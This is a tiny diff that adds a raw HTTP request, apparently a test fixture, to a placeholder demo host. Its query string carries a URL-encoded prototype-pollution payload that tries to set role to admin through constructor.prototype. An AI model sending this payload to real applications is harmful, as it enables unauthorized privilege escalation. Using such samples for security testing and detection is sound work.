@@ -1,0 +1,4 @@
+GET /a?id=%7B%22constructor%22%3A%7B%22prototype%22%3A%7B%22role%22%3A%22admin%22%7D%7D%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
